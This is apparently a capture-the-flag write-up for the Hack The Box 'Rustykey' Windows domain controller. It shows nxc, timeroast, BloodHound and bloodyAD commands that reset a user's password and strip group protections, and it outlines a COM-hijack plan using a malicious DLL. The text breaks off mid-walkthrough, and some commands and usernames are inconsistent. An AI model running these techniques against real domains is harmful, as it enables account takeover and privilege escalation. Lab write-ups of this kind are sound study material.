# Rustykey

**Difficoltà:** Hard
**OS:** Windows
**Date:** 21/03/2026

## Pre-Engagement 
IP target: 10.129.232.127
Credentials: rr.parker:8#t5HE8L!W3A

## Scanning & Enumeration

`nmap -sCV -vv -oA nmap/rustykey 10.129.232.127`

<img width="1236" height="699" alt="image" src="https://github.com/user-attachments/assets/6493c81a-e533-45f9-891e-18b5f2a3354a" />

Ports 80 and 443 are not open(no web server). The standard ports for a domain controller are detected: DNS(53), RPC(135), LDAP(389,3268), SMB(445), and WinRM(5985). 
So let's proceed by listing these services/ports.

## clock synchronization

Kerberos includes a timestamp-based anti-replay mechanism: each ticket (TGT,TGS) contains the time at which it was generated. When the KDC receives a request, it compares the ticket's timestamp with its own clock. If the difference exceeds 5 minutes, the DC rejects the ticket with an error (KRB_AP_ERR_SKEW - Clock skew too great).

`sudo ntpdate 10.129.232.127`

<img width="716" height="37" alt="image" src="https://github.com/user-attachments/assets/262e2512-6275-411d-bdbe-0a0a51f542ca" />

### SMB Enumeration

`nxc smb 10.129.232.127 -u r.parker -p '8#t5HE8L!W3A'`

This error inidcates thet NTLM authentication is disabled. So, we need to find another way to "comunicate" with Kerberos. Another important security note is that "signing:True" is set, so NTLM Relay is not possible.
<img width="930" height="79" alt="image" src="https://github.com/user-attachments/assets/769997ef-1e4f-46f9-b700-093052548041" />

Kerberos doesen't work magically, our linux system needs to know where to go to obtain tickets. This information is configured via a standard Linux file caled "kerb5.conf". By default, linux looks for the kerberos configuration in "/etc/krb5.conf". With this environment variable, you are telling all Kerberos tools on the system " dont use the system configuration, use this specific file for this HTB box".

`nxc smb 10.129.232.127 --generate-krb5-file rustykey.krb`

<img width="932" height="105" alt="image" src="https://github.com/user-attachments/assets/fcbc802f-f504-4b53-a9d8-9d27cc0e2a44" />

`sudo cp rustykey.krb /etc/krb5.conf`

<img width="333" height="38" alt="image" src="https://github.com/user-attachments/assets/dc0ba6dc-c5ea-4c07-9efc-4acf98f32470" />

Now let's finally see if the credentials provided are valid in the domain using Kerberos authentication.

`nxc smb 10.129.232.127 -u r.parker -p '8#t5HE8L!W3A' -k`

<img width="938" height="95" alt="image" src="https://github.com/user-attachments/assets/c9c43de7-5ada-438f-8e97-88fe5a5a86e7" />

Let's list the SMB shares that are accessible to Parker to understand his access level in the domain. 

`nxc smb 10.129.232.127 -u rr.parker -p '8#t5HE8L!W3A' -k  --shares`

<img width="940" height="209" alt="image" src="https://github.com/user-attachments/assets/5a0d9e45-3bd7-475d-96ac-e342eef2ac94" />

There are no interesting shares, so let's proceed to map the domain using Bloodhound. First, let's all the data that Parker might request using RustHound. 

<img width="1439" height="767" alt="image" src="https://github.com/user-attachments/assets/5d1a18d9-e003-4986-90a4-b1668607bc10" />

If we experiment a bit with BloodHound and dont get any results, manually entered query in these situations. This qury shows us all direct permissions that users and computers have on other domain objects.

`MATCH p=(source)-[r]->(target)
WHERE (source:Computer or source:user)
AND type(r)<> 'MemberOf'
return p`

<img width="1397" height="405" alt="image" src="https://github.com/user-attachments/assets/075d3c45-cf2b-44bf-972b-135e37a10164" />

The key point we can see are: 1)IT-Computer 3 has the "AddSelf" permission for the HelpDesk group. 2)IT-Computer 3 was created on December 26, and its password was changed on December 27. Computer objects dont work that way, the password changes every 30 day. Now let's take a look at the HelDesk group.

<img width="1250" height="621" alt="image" src="https://github.com/user-attachments/assets/4fd1bb93-98c7-4e56-ab59-ef7e1b42eaec" />

By doing lateral movment, we can find some users who connect via winrm.

<img width="1769" height="454" alt="image" src="https://github.com/user-attachments/assets/4e681800-f17d-4203-bc7e-bd1382d8c218" />

First, we need to take control of the machine account. There are two methods: if it is configured with "legacy" authentication (pre-Windows2000), the password may be the same as the computer name. Review the account history to identify human errors (in our case, the password was changed by an administrator, so it will be weak).

## Time Roasting Attack
This attack sends a malformed NTP (Network Time Protocol) request to the domain controller on behalf of the computer account. The server responds with timestamp is encrypted using the account's NTLM hash. 

`nxc smb 10.129.232.127 -M timeroast`

<img width="1596" height="322" alt="image" src="https://github.com/user-attachments/assets/596dbb93-3b8e-4ae8-9bc4-5c2e1ad272c6" />

Now let's add the computer to the HelpDesk group

`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k add groupMember HelpDesk 'IT-COMPUTER3$' `

<img width="672" height="44" alt="image" src="https://github.com/user-attachments/assets/ebf19a01-5aa9-4b12-8ec2-8ec7a7a9e6b6" />

Next, we'll change the password for the user bb.morgan
`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password bb.morgan 'GiorginaDellaGarbatella!'`

<img width="662" height="45" alt="image" src="https://github.com/user-attachments/assets/4a9131f3-c39f-4ee7-af87-fb7e453f96ef" />

When we try to request a TGT ticket, we get an error because the user is in the Protected Users group.
More info: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

`impacket-getTGT rustykey.htb/bb.morgan:'GiorginaDellaGarbatella!' -dc-ip 10.129.232.127`

<img width="766" height="76" alt="image" src="https://github.com/user-attachments/assets/17b4abee-1e86-4d0a-8ace-9736a0ed13d1" />

To bypass this group, we need to remove Morgan from it.

`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT'`

<img width="943" height="67" alt="image" src="https://github.com/user-attachments/assets/0ba34bcd-8f75-42b6-abfe-6aca35a4f930" />

Now we can request TGT ticket for Morgan.

`impacket-getTGT rustykey.htb/bb.morgan:'GiorginaDellaGarbatella!' -dc-ip 10.129.232.127`

When we access the system via WinRM, we find a PDF file. The keywords in it are "extraction/compression", which clearly indicates software for managing archives (zip, rar). Windwows uses COM objects to allow different programs to share functionality. For example, when you  right-click and select “Extract”, wndows doesn't natively know how to unzip it. Instead, it consults the Registry by looking for a unique code called CLSID. The CLSID tells it: "To openthis file, load this specific DLL". So, if we can identify which CLSID is used for zip file and have the permissions to modify uts value in the registry, we can replace the path to the legitimate DLL with that of a malicius DLL.

<img width="752" height="372" alt="image" src="https://github.com/user-attachments/assets/3b70c224-a49e-4093-8420-3c71fa818ebc" />

Now we need to find the exact CLSID associated with 7-Zip in the Windows Registry.

`reg query HKCR\CLSID /s /f "zip"`

<img width="629" height="55" alt="image" src="https://github.com/user-attachments/assets/50ad7c0a-98db-43cc-a543-3447cc14f54d" />

Now that we have found the registry key, we need to figure out who has permission to edit it.

`C:\Program Files> Get-Acl -Path "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}" | Format-List`

<img width="1333" height="241" alt="image" src="https://github.com/user-attachments/assets/4d3c0d62-f5b1-47cb-9f4b-42c2d98e7c1b" />

We find that the Support group has full control; the user morgan is not a meber of this group, so they cannot modify the key. Let's check the group members on Bloodhound

<img width="919" height="253" alt="image" src="https://github.com/user-attachments/assets/96a30e2c-4b58-4e33-ad55-2970d945f932" />

Now we need to take control of EE.REED.
``
``
``







